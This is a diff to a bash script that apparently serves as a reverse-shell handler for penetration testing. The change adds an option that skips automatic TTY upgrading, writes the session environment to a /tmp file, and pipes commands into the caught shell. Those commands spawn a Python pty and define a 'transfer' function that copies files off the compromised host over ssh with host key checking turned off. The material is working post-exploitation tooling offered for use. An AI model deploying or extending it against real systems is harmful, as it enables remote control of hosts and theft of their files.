@@ -6,8 +6,10 @@ HOSTNAME=$(hostname)
 
 usage() {
   cat <<- _EOM_
-Usage: $0 [OPTIONS] [-c|-a <SSH public key>|-r <SSH public key>]
+Usage: $0 [OPTIONS] [-c [-s]|-a <SSH public key>|-r <SSH public key>]
   -c                    Connect to the remote shell endpoint
+  -s                    Do not attempt to launch a full TTY when connecting to
+                        the remote endpoint
   -a <SSH public key>   Add <SSH public key> to authorized_keys
   -r <SSH public key>   Remove <SSH public key> from authorized_keys
   DEFAULT               Listen for incomming connections
@@ -31,7 +33,7 @@ shellregister() {
     SSHSHELL_PORT=$(($SSHSHELL_PORT + 1))
   done
 
-  touch /tmp/sshshell/${SSHSHELL_PIPE_ID}
+  env > /tmp/sshshell/${SSHSHELL_PIPE_ID}
 }
 
 shellunregister() {
@@ -68,6 +70,9 @@ while getopts "a:r:u:hcs" o; do
       ;;
     c)
       CONNECTION=1
+      ;;
+    s)
+      SIMPLE=1
       ;;
     *)
       usage
@@ -186,7 +191,11 @@ else
 fi
 
 echo "Connecting to $SSHSHELL_PIPE_ID..."
-cat << _EOM_
+SSHSHELL_PORT=`echo $SSHSHELL_PIPE_ID | cut -d _ -f 2`
+
+if [ "${SIMPLE}" == "1" ]
+then
+  cat << _EOM_
 Upgrade to a full TTY:
 * Launch a ptty:
   $ python -c 'import pty; pty.spawn("/bin/bash")'
@@ -198,6 +207,20 @@ Upgrade to a full TTY:
   $ fg
   $ reset; export SHELL=bash; export TERM=xterm-256color; stty rows `tput lines` columns `tput cols`
 _EOM_
+  nc -vv 127.0.0.1 $SSHSHELL_PORT
+else
+  SSH_SERVER_IP=$(cat /tmp/sshshell/$SSHSHELL_PIPE_ID | grep SSH_CONNECTION | head -1 | awk '{print $3}')
 
-SSHSHELL_PORT=`echo $SSHSHELL_PIPE_ID | cut -d _ -f 2`
-nc -vv 127.0.0.1 $SSHSHELL_PORT
+  # Attempt to send the commands to upgrade to a full TTY automatically
+  stty raw -echo
+  cat <(cat << _EOF_
+  { script 2>/dev/null ||  python -c 'import pty; pty.spawn("/bin/bash")' || echo No pty available ; exit ; }
+_EOF_
+  ) <(cat << _EOF_
+  reset; export SHELL=bash; export TERM=xterm-256color; stty rows `tput lines` columns `tput cols`
+  transfer() { cat \$1 | ssh -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null" ${USER}@${SSH_SERVER_IP} transfer "\$1" ; }
+  id
+_EOF_
+  ) - | nc -vv 127.0.0.1 $SSHSHELL_PORT
+  reset
+fi
